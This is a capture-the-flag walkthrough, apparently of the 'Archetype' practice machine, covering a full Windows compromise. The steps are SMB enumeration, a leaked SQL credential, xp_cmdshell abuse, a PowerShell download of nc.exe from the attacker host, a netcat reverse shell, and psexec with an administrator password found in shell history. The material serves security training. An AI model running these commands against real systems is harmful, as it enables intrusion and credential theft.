![Archetype.jpg](/assets/Tier-2/Archetype/archetype.jpg)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.129.101.211
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.101.211
```

**Output**
```bash
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```


3. Explore SMB
```bash
┌──(root㉿kali)-[/home/kali]
└─| smbclient -L 10.129.101.211
```

**Output**
```bash
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.101.211 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
---
Next, connect to **backups**
```bash
┌──(root㉿kali)-[/home/kali]
└─| smbclient \\\\10.129.101.211\\backups
```
---
List files and get

```bash
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020   
  ..                                  D        0  Mon Jan 20 07:20:57 2020   
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020   
                                                                             
                5056511 blocks of size 4096. 2609323 blocks available
```

```bash
smb: \> get prod.dtsConfig
```



4. Show **prod.dtsConfig** file
```bash
┌──(root㉿est)-[/home/kali/Desktop/Archetype]
└─| cat prod.dtsConfig 
```
**Output**
```bash
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration> 
```

* We get important information like username **ARCHETYPE\sql_svc** and password **M3g4c0rp123**



5. Connect to mssqlclient with credentials found

```bash
┌──(root㉿est)-[/home/kali]
└─| /usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc@10.129.101.211 -windows-auth
```

6. Look all options
```bash
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```
---
Next, enable **xp_cmdshell** and **RECONFIGURE** file
```bash
SQL> enable_xp_cmdshell
SQL> RECONFIGURE
```

7. Download two tools **nc.exe** and **winPEAS**
+ **nc.exe**: https://github.com/int0x33/nc.exe/
+ **winPEAS**: https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe


8. Create a server with Python in folder tools.
```bash
┌──(root㉿est)-[/home/kali/Desktop/Archetype]
└─| python3 -m http.server 80 
```

9.  Now go to download this files in directory with command **xp_cmdshell**
```bash
SQL> xp_cmdshell "powershell -c cd C:\Users\Public; wget http://10.10.14.251/nc.exe -outfile nc.exe"
```

```bash
SQL> xp_cmdshell "powershell -c cd C:\Users\Public; wget http://10.10.14.251/winPEASx64.exe -outfile winP.exe"
```

10. Now, with nc.exe in server execute a reverse shell.
    
First, listen in port 444
```bash
┌──(root㉿est)-[/home/kali/Desktop/Archetype]
└─| nc -lvnp 4444
```
---
Next, execute a command into SQL
```bash
SQL> xp_cmdshell "powershell -c cd C:\Users\Public; .\nc.exe -e cmd.exe 10.10.14.251 4444"
```
---
We obtain reverse shell
```bash
connect to [10.10.14.251] from (UNKNOWN) [10.129.101.211] 49678
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Public>
```

11. Execute winPEAS.exe to escalate privileges 

```bash
C:\Users\Public> .\winP.exe
```

**Output**
```bash
             *((,.,/((((((((((((((((((((/,  */                         
      ,/*,..*((((((((((((((((((((((((((((((((((,                       
    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*                    
    ((((((((((((((((**********/########## .(* ,(((((((                 
    (((((((((((/********************/####### .(. (((((((               
    ((((((..******************/@@@@@/***/###### ./(((((((              
    ,,....********************@@@@@@@@@@(***,#### .//((((((            
    , ,..********************/@@@@@%@@@@/********##((/ /((((           
    ..((###########*********/%@@@@@@@@@/************,,..((((           
    .(##################(/******/@@@@@/***************.. /((           
    .(#########################(/**********************..*((           
    .(##############################(/*****************.,(((           
    .(###################################(/************..(((           
    .(#######################################(*********..(((           
    .(#######(,.***.,(###################(..***.*******..(((           
    .(#######*(#####((##################((######/(*****..(((           
    .(###################(/***********(##############(...(((           
    .((#####################/*******(################.((((((           
    .(((############################################(..((((            
    ..(((##########################################(..(((((            
    ....((########################################( .(((((             
    ......((####################################( .((((((              
    (((((((((#################################(../((((((               
        (((((((((/##########################(/..((((((                 
              (((((((((/,.  ,*//////*,. ./(((((((((((((((.             
                 (((((((((((((((((((((((((((((/ 
                         ...

����������͹ Analyzing Windows Files Files (limit 70)
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt                                          
C:\Users\Default\NTUSER.DAT
C:\Users\sql_svc\NTUSER.DAT
```

12. Search in this paths
```cmd
C:\Users\Public>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Output**
```cmd
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```


13. **User flag** is in path `C:\Users\sql_svc\Desktop`
```cmd
C:\Users\sql_svc\Desktop>type user.txt
type user.txt
3e7b102e78218e935bf3f4951fec21a3
```


14. With `/usr/bin/impacket-psexec` open a cmd with credentials found
* **username**: administrator
* **password**: MEGACORP_4dm1n!!
```bash
/usr/bin/impacket-psexec administrator@10.129.101.211
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:

```

**Output**
```cmd
C:\Windows\system32>
```

15. Flag is in path `C:\Users\Administrator\Desktop`
```cmd
C:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528
```